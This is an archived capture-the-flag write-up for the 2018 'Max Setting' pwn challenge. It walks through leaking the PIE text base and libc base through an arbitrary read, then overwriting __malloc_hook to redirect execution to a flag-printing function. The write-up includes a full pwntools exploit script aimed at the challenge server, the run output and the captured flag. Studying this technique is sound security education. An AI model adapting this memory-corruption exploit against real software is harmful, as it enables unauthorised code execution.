# maxsetting

**CTF:** ViettelMates 2018  
**Category:** misc  
**Original writeup:** <https://ctftime.org/writeup/10249> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

## === Max Setting (Pwn: 22 solves / 400 teams, 150 pts) ===

Solution:

1. This binary can read and write 8 bytes to any address more than once.

2. I can get the text address from the stack.

3. I read the stack data for 256/8 = 32 pieces. Only the address of the text section (address > `0x500000000000` and address < `0x600000000000` ) is extracted. I subtracted 0xa0a from the address, if the lower address became 0x000, I judged it as text base address.

```

leak_data = 0x55f7cce49a0a

text_base = leak_data - 0xa0a = `0x55f7cce49000`

```



4. I can get the base address of libc from GOT address.

```

read_got = `0x55f7cd049fc8`

read_addr = `0x7f007958c070`

libc_base = read_addr - libc.symbols['read'] = `0x7f007947c000`

```

5. There is a EzMoney() function that can display flag.

```

int EzMoney()

{

return system("cat flag");

}

```

6. I found that when calling `_IO_getc()` function, the address written to `__malloc_hook` will be called.

```

puts("

Exit for sure?

");

if ( _IO_getc(stdin) == 'y' )

puts("Bye bye");

else

puts("Haha ... goodbye");

```

7. Because write( `0` , buf, 8) function is writing to stdin(0), I changed the execution binary to stdout(1).

```

00000980 f0 ba 08 00 00 00 48 89 c6 bf `00` 00 00 00 e8 bd

00000980 f0 ba 08 00 00 00 48 89 c6 bf `01` 00 00 00 e8 bd

```





The Exploit code is shown below.

```

from pwn import *

#context.log_level = 'debug'

BINARY = './maxsetting_stdin2stdout'

elf = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':

HOST = "125.235.240.167"

PORT = 4001

s = remote(HOST, PORT)

libc = ELF("./libc-2.27.so")

else:

#s = process([BINARY],env={'LD_PRELOAD': './libc-2.27.so'})

#libc = ELF("./libc-2.27.so")

s = process(BINARY)

libc = elf.libc

for i in range(0,32):

if i == 0:

s.send(chr(i*8))

else:

s.send("y"+chr(i*8))

s.send("

")

s.recvuntil("You wrote: ")

r = s.recv(8)

leak_data = u64(r)

print i, "leak_data =", hex(leak_data)

if leak_data > 0x500000000000 and leak_data < 0x600000000000:

text_base = leak_data - 0xa0a

if text_base & 0xfff == 0:

print " text_base =", hex(text_base)

break

s.recvuntil("Try again?

")

EzMoney_adr = text_base + 0x90e

read_got = text_base + 0x200FC8

print "read_got =", hex(read_got)

s.recvuntil("Try again?

")

s.send("y")

s.send(p64(read_got))

s.send("y")

s.recvuntil("You wrote: ")

r = s.recv(8)

read_addr = u64(r)

libc_base = read_addr - libc.symbols['read']

malloc_hook = libc_base + libc.symbols['__malloc_hook']

print "read_addr =", hex(read_addr)

print "libc_base =", hex(libc_base)

print "malloc_hook =", hex(malloc_hook)

s.recvuntil("Try again?

")

#s.send("y")

s.send(p64(malloc_hook))

s.send(p64(EzMoney_adr))

s.recvuntil("Try again?

")

s.send("n")

s.interactive()

```

The execution results are shown below.

```

guest@ubuntu:~/Pwn_Max_Setting$ python exploit.py r

Arch: amd64-64-little

RELRO: Full RELRO

Stack: Canary found

NX: NX enabled

PIE: PIE enabled

[+] Opening connection to 125.235.240.167 on port 4001: Done

Arch: amd64-64-little

RELRO: Partial RELRO

Stack: Canary found

NX: NX enabled

PIE: PIE enabled

0 leak_data = 0x8

1 leak_data = 0x7f007958c081

2 leak_data = 0xb

3 leak_data = 0x7f0079a8c4c0

4 leak_data = 0x55f7cce49a0a

text_base = 0x55f7cce49000

read_got = 0x55f7cd049fc8

read_addr = 0x7f007958c070

libc_base = 0x7f007947c000

malloc_hook = 0x7f0079867c30

[*] Switching to interactive mode

Exit for sure?

matesctf{Ezmoney_3zm0n3y_too_3z}

```
